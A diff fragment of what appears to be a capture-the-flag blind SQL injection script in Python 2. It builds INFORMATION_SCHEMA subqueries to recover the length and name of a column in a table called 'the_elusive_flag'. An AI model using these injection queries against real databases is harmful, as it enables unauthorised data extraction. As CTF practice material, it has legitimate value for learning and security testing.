@@ -49,7 +49,6 @@ print 'table_name =',t
 clen=getLength("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND LENGTH(COLUMN_NAME) BETWEEN %d AND %d)")
 print 'len(%s.column_name) = %d'%(t,clen)
 
-
 c=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND %s)","COLUMN_NAME",clen)
 print '%s.column_name = %s'%(t,c)
 
